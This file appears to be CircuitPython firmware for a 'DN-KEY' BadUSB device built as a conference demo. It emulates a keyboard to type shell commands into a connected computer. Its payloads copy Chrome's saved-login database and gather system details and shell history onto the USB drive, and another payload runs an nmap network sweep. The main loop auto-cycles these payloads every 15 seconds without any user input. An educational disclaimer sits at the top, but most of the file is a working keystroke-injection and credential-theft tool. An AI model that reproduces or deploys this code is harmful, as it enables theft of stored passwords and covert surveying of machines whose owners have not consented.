'''
DN-KEY DC33 Demo (Regular DN Key)

DISCLAIMER:
This software is provided for educational and authorized testing purposes only.
Users are responsible for ensuring they have proper authorization before using
this tool on any system or network. The authors are not responsible for any
misuse or damage caused by this software. Use at your own risk and in
compliance with applicable laws and regulations.

Features:
- HID BadUSB (Ducky Scripts) - Execute scripts with visual feedback
- Terminal Automation (cmatrix, htop, system commands)
- Web Navigation (globaldatapolice site showcases)
- Data Exfiltration (Chrome Passwords, System Information)
- Mouse Jiggler with touch control
- Visual LED animations and feedback
- Touch-based menu navigation
- Auto-restart functionality

This DC33 demo is optimized for speed and visual engagement while maintaining
stability on the regular DN Key hardware.

Manifested by 0x0630ff x Made Evil by gh0st
'''

import time
import board
import neopixel
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from adafruit_hid.mouse import Mouse
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode
import touchio
import supervisor
import storage
import os
import random

# Hardware setup for DN Key
touch1_pin = touchio.TouchIn(board.TOUCH1)
touch2_pin = touchio.TouchIn(board.TOUCH2)
touch2_pin.threshold = 13000

pixel_pin = board.EYES
num_pixels = 2
pixels = neopixel.NeoPixel(pixel_pin, num_pixels, brightness=0.3, auto_write=False)

# HID setup
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)
mouse = Mouse(usb_hid.devices)
consumer_control = ConsumerControl(usb_hid.devices)

# Color definitions for enhanced visual feedback
NEON_GREEN = (0, 255, 0)
NEON_PURPLE = (255, 0, 255)
NEON_PINK = (255, 20, 147)
NEON_BLUE = (0, 255, 255)
NEON_ORANGE = (255, 140, 0)
NEON_RED = (255, 0, 0)
NEON_WHITE = (255, 255, 255)
NEON_YELLOW = (255, 255, 0)

# Demo state variables
demo_running = True
current_sequence = 0
mouse_jiggler_active = False
sequence_delay = 0.03  # Even faster execution for better engagement
auto_cycle_enabled = True
last_sequence_time = 0
auto_cycle_interval = 15  # Auto-cycle every 15 seconds

def set_led_color(color, duration=0.1):
    """Set LED color with optional duration"""
    pixels.fill(color)
    pixels.show()
    if duration > 0:
        time.sleep(duration)

def led_pulse(color, pulses=3, speed=0.1):
    """Create pulsing LED effect"""
    for _ in range(pulses):
        pixels.fill(color)
        pixels.show()
        time.sleep(speed)
        pixels.fill((0, 0, 0))
        pixels.show()
        time.sleep(speed)

def led_rainbow_cycle(duration=2.0):
    """Rainbow cycle effect for visual engagement"""
    steps = 50
    for i in range(steps):
        hue = (i * 255) // steps
        # Simple HSV to RGB conversion for rainbow effect
        if hue < 85:
            r, g, b = hue * 3, 255 - hue * 3, 0
        elif hue < 170:
            hue -= 85
            r, g, b = 255 - hue * 3, 0, hue * 3
        else:
            hue -= 170
            r, g, b = 0, hue * 3, 255 - hue * 3
        
        pixels.fill((r, g, b))
        pixels.show()
        time.sleep(duration / steps)

def type_fast(text, delay=0.015):
    """Fast typing with visual feedback"""
    set_led_color(NEON_BLUE, 0)
    for char in text:
        keyboard_layout.write(char)
        time.sleep(delay)
    set_led_color(NEON_GREEN, 0.1)

def execute_key_combo(keys, delay=0.08):
    """Execute key combination with visual feedback"""
    set_led_color(NEON_ORANGE, 0)
    keyboard.press(*keys)
    time.sleep(delay)
    keyboard.release_all()
    set_led_color(NEON_GREEN, 0.1)

def dump_chrome_passwords():
    """Enhanced Chrome password dump with visual feedback"""
    print("Chrome Password Exfiltration - Enhanced")
    led_pulse(NEON_RED, 5, 0.1)
    
    # Open terminal faster
    execute_key_combo([Keycode.GUI, Keycode.SPACE], 0.2)
    type_fast("terminal", 0.02)
    execute_key_combo([Keycode.ENTER], 0.3)
    
    # Execute enhanced Chrome dump script
    commands = [
        "echo 'DN-KEY Chrome Password Exfiltration - DC33 Demo'",
        "echo '================================================'",
        "if [[ \"$OSTYPE\" == \"darwin\"* ]]; then",
        "    CHROME_PATH=\"$HOME/Library/Application Support/Google/Chrome/Default/Login Data\"",
        "    echo 'macOS detected - Chrome path: '$CHROME_PATH",
        "    if [ -f \"$CHROME_PATH\" ]; then",
        "        echo 'Chrome Login Data found! Extracting...'",
        "        cp \"$CHROME_PATH\" /Volumes/DN_KEY/chrome_passwords_$(date +%Y%m%d_%H%M%S).db",
        "        echo 'Chrome passwords extracted to DN-KEY!'",
        "    else",
        "        echo 'Chrome Login Data not found'",
        "    fi",
        "elif [[ \"$OSTYPE\" == \"linux-gnu\"* ]]; then",
        "    CHROME_PATH=\"$HOME/.config/google-chrome/Default/Login Data\"",
        "    echo 'Linux detected - Chrome path: '$CHROME_PATH",
        "    if [ -f \"$CHROME_PATH\" ]; then",
        "        echo 'Chrome Login Data found! Extracting...'",
        "        cp \"$CHROME_PATH\" /media/*/DN_KEY/chrome_passwords_$(date +%Y%m%d_%H%M%S).db 2>/dev/null",
        "        echo 'Chrome passwords extracted to DN-KEY!'",
        "    else",
        "        echo 'Chrome Login Data not found'",
        "    fi",
        "fi",
        "echo 'Exfiltration complete - Check DN-KEY drive'"
    ]
    
    for cmd in commands:
        type_fast(cmd, 0.02)
        execute_key_combo([Keycode.ENTER], 0.03)
    
    led_pulse(NEON_GREEN, 2, 0.1)

def collect_system_info():
    """Enhanced system info collection with visual feedback"""
    print("System Information Collection - Enhanced")
    led_pulse(NEON_YELLOW, 5, 0.1)
    
    # Open new terminal tab for system info
    execute_key_combo([Keycode.GUI, Keycode.T], 0.3)
    
    # Create and execute comprehensive system info script
    commands = [
        "echo 'DN-KEY System Information Collection - DC33 Demo'",
        "echo '================================================'",
        "cat > /tmp/dnkey_sysinfo.sh << 'EOF'",
        "#!/bin/bash",
        "echo '=== DN-KEY System Information ==='",
        "echo 'Timestamp: '$(date)",
        "echo 'Hostname: '$(hostname)",
        "echo 'User: '$(whoami)",
        "echo 'OS: '$(uname -s)' '$(uname -r)",
        "echo 'Architecture: '$(uname -m)",
        "echo 'Uptime: '$(uptime | cut -d',' -f1)",
        "echo 'Current Directory: '$(pwd)",
        "echo 'Home Directory: '$HOME",
        "echo 'Shell: '$SHELL",
        "echo 'Network Interfaces:'",
        "ifconfig | grep -E '^[a-z]' | awk '{print $1}' | head -5",
        "echo 'Active Network Connections:'",
        "netstat -an | grep LISTEN | head -10",
        "echo 'Recent Commands (last 10):'",
        "history | tail -10",
        "echo 'Environment Variables (key ones):'",
        "env | grep -E '^(PATH|HOME|USER|SHELL)=' | head -5",
        "echo '=== End System Info ==='",
        "EOF",
        "chmod +x /tmp/dnkey_sysinfo.sh",
        "/tmp/dnkey_sysinfo.sh > /Volumes/DN_KEY/system_info_$(date +%Y%m%d_%H%M%S).txt",
        "echo 'System info saved to DN-KEY drive!'",
        "rm /tmp/dnkey_sysinfo.sh"
    ]
    
    for cmd in commands:
        type_fast(cmd, 0.02)
        execute_key_combo([Keycode.ENTER], 0.03)
    
    led_pulse(NEON_GREEN, 2, 0.1)

def showcase_globaldatapolice_commands():
    """Showcase commands from globaldatapolice site with visual engagement"""
    print("GlobalDataPolice Command Showcase - DC33 Demo")
    led_rainbow_cycle(1.0)
    
    # Open new terminal
    execute_key_combo([Keycode.GUI, Keycode.T], 0.3)
    
    # Navigate to globaldatapolice and showcase commands
    commands = [
        "echo 'DN-KEY GlobalDataPolice Command Showcase'",
        "echo '========================================'",
        "curl -s https://globaldatapolice.com/help | head -20",
        "echo ''",
        "echo 'Demonstrating key security commands:'",
        "echo '1. Network scanning...'",
        "nmap -sn 192.168.1.0/24 | head -10",
        "echo '2. Process monitoring...'",
        "ps aux | head -10",
        "echo '3. Network connections...'",
        "lsof -i | head -10",
        "echo '4. System resources...'",
        "top -l 1 | head -15",
        "echo '5. File system analysis...'",
        "find /tmp -name '.*' -type f | head -10",
        "echo 'Command showcase complete!'"
    ]
    
    for i, cmd in enumerate(commands):
        # Visual feedback for each command
        if i % 3 == 0:
            set_led_color(NEON_BLUE, 0.1)
        elif i % 3 == 1:
            set_led_color(NEON_PURPLE, 0.1)
        else:
            set_led_color(NEON_ORANGE, 0.1)
        
        type_fast(cmd, 0.02)
        execute_key_combo([Keycode.ENTER], 0.1)
    
    led_pulse(NEON_GREEN, 5, 0.1)

def terminal_automation_sequence():
    """Enhanced terminal automation with visual effects"""
    print("Terminal Automation Sequence - Enhanced")
    led_rainbow_cycle(1.5)
    
    # Open terminal
    execute_key_combo([Keycode.GUI, Keycode.SPACE], 0.3)
    type_fast("terminal", 0.03)
    execute_key_combo([Keycode.ENTER], 0.5)
    
    # Matrix effect with enhanced visuals
    set_led_color(NEON_GREEN, 0.1)
    type_fast("echo 'DN-KEY Matrix Effect - DC33 Demo'", 0.02)
    execute_key_combo([Keycode.ENTER], 0.2)
    
    if os.system("which cmatrix") == 0:
        type_fast("cmatrix -s -C red", 0.02)
        execute_key_combo([Keycode.ENTER], 3.0)  # Let matrix run for 3 seconds
        execute_key_combo([Keycode.CONTROL, Keycode.C], 0.2)
    else:
        # Fallback matrix effect
        type_fast("for i in {1..20}; do echo 'DN-KEY-$i: $(date) - MATRIX EFFECT'; sleep 0.1; done", 0.02)
        execute_key_combo([Keycode.ENTER], 2.0)
    
    # Split screen effect
    execute_key_combo([Keycode.GUI, Keycode.D], 0.3)  # Split screen
    
    # System monitoring
    set_led_color(NEON_YELLOW, 0.1)
    type_fast("htop", 0.02)
    execute_key_combo([Keycode.ENTER], 2.0)  # Show htop for 2 seconds
    execute_key_combo([Keycode.Q], 0.2)  # Quit htop
    
    led_pulse(NEON_GREEN, 2, 0.1)

def web_navigation_demo():
    """Enhanced web navigation with globaldatapolice showcase"""
    print("Web Navigation Demo - GlobalDataPolice Showcase")
    led_pulse(NEON_BLUE, 5, 0.1)
    
    # Open Safari/Chrome
    execute_key_combo([Keycode.GUI, Keycode.SPACE], 0.3)
    type_fast("safari", 0.03)
    execute_key_combo([Keycode.ENTER], 1.5)  # Wait for browser to load
    
    # Make browser full screen for better demo presentation
    execute_key_combo([Keycode.CONTROL, Keycode.GUI, Keycode.F], 0.5)  # macOS full screen
    time.sleep(0.5)  # Wait for full screen animation
    
    # Navigate to globaldatapolice
    execute_key_combo([Keycode.GUI, Keycode.L], 0.3)  # Address bar
    type_fast("https://globaldatapolice.com", 0.03)
    execute_key_combo([Keycode.ENTER], 2.0)
    
    # Demonstrate site navigation
    time.sleep(1.0)
    execute_key_combo([Keycode.TAB], 0.2)  # Navigate through elements
    execute_key_combo([Keycode.TAB], 0.2)
    execute_key_combo([Keycode.ENTER], 0.5)  # Click on help/commands
    
    # Show help commands
    time.sleep(1.0)
    execute_key_combo([Keycode.GUI, Keycode.F], 0.3)  # Find
    type_fast("help", 0.03)
    execute_key_combo([Keycode.ENTER], 0.5)
    
    led_pulse(NEON_GREEN, 2, 0.1)

def mouse_jiggler_toggle():
    """Enhanced mouse jiggler with visual feedback"""
    global mouse_jiggler_active
    mouse_jiggler_active = not mouse_jiggler_active
    
    if mouse_jiggler_active:
        print("Mouse Jiggler ACTIVATED")
        led_pulse(NEON_ORANGE, 5, 0.1)
        set_led_color(NEON_ORANGE, 0)
    else:
        print("Mouse Jiggler DEACTIVATED")
        led_pulse(NEON_GREEN, 3, 0.1)
        set_led_color(NEON_GREEN, 0)

def mouse_jiggler_update():
    """Perform mouse jiggling with random movement"""
    if mouse_jiggler_active:
        # Random small movements
        dx = random.randint(-3, 3)
        dy = random.randint(-3, 3)
        mouse.move(dx, dy)
        
        # Occasional larger movement
        if random.randint(1, 50) == 1:
            mouse.move(random.randint(-20, 20), random.randint(-20, 20))

def run_demo_sequence():
    """Main demo sequence with enhanced visuals and speed"""
    global current_sequence
    
    sequences = [
        ("Terminal Automation", terminal_automation_sequence),
        ("Chrome Password Dump", dump_chrome_passwords),
        ("System Info Collection", collect_system_info),
        ("GlobalDataPolice Showcase", showcase_globaldatapolice_commands),
        ("Web Navigation Demo", web_navigation_demo)
    ]
    
    if current_sequence >= len(sequences):
        current_sequence = 0
    
    seq_name, seq_func = sequences[current_sequence]
    print(f"\n=== Running: {seq_name} ===")
    
    # Visual sequence indicator
    led_rainbow_cycle(0.3)
    
    try:
        seq_func()
        print(f"=== Completed: {seq_name} ===\n")
        led_pulse(NEON_GREEN, 2, 0.1)
    except Exception as e:
        print(f"Error in {seq_name}: {e}")
        led_pulse(NEON_RED, 5, 0.1)
    
    current_sequence += 1

def handle_touch_input():
    """Handle touch input for demo control"""
    if touch1_pin.value:
        print("Touch 1: Running next demo sequence")
        led_pulse(NEON_BLUE, 2, 0.1)
        run_demo_sequence()
        time.sleep(0.5)  # Debounce
        
    if touch2_pin.value:
        print("Touch 2: Toggle mouse jiggler")
        mouse_jiggler_toggle()
        time.sleep(0.5)  # Debounce



def startup_sequence():
    """Enhanced startup sequence with rainbow eyes"""
    print("DN-KEY DC33 Demo Starting...")
    
    # Rainbow startup sequence for visual engagement when first plugged in
    print("Rainbow LED startup sequence...")
    colors = [NEON_RED, NEON_ORANGE, NEON_YELLOW, NEON_GREEN, NEON_BLUE, NEON_PURPLE]
    
    # Rainbow cycle effect - 3 cycles
    for cycle in range(3):
        for color in colors:
            pixels.fill(color)
            pixels.show()
            time.sleep(0.2)
    
    # Final pulse in green to indicate ready
    for _ in range(5):
        pixels.fill(NEON_GREEN)
        pixels.show()
        time.sleep(0.1)
        pixels.fill((0, 0, 0))
        pixels.show()
        time.sleep(0.1)
    
    set_led_color(NEON_GREEN, 0.5)
    print("DN-KEY DC33 Demo Ready!")
    print("Touch 1: Run demo sequences")
    print("Touch 2: Toggle mouse jiggler")

# Main execution
try:
    startup_sequence()
    
    # Main loop with auto-cycling
    import time
    last_sequence_time = time.time()
    
    while demo_running:
        current_time = time.time()
        
        # Auto-cycle demo sequences
        if auto_cycle_enabled and (current_time - last_sequence_time) >= auto_cycle_interval:
            print("Auto-cycling to next demo sequence...")
            run_demo_sequence()
            last_sequence_time = current_time
        
        handle_touch_input()
        mouse_jiggler_update()
        time.sleep(0.05)  # Faster response time
        
except KeyboardInterrupt:
    print("\nDemo stopped by user")
    set_led_color((0, 0, 0), 0.1)
    
except Exception as e:
    print(f"Demo error: {e}")
    led_pulse(NEON_RED, 10, 0.1)
    supervisor.reload()
